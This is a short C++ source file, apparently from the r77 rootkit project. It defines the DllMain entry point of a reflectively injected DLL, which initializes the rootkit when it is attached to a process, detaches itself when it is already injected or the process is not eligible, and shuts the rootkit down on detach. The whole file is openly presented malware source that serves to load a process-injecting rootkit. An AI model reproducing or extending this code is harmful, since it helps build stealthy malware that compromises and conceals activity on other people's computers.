#include "r77.h"
#include "ReflectiveDll.h"

BOOL WINAPI DllMain(HINSTANCE module, DWORD reason, LPVOID reserved)
{
	if (reason == DLL_PROCESS_ATTACH)
	{
		if (!Rootkit::Initialize(module))
		{
			// If the rootkit could not initialize, is already injected, or not eligible for this process, detach the DLL.
			return FALSE;
		}
	}
	else if (reason == DLL_PROCESS_DETACH)
	{
		Rootkit::Shutdown();
	}

	return TRUE;
}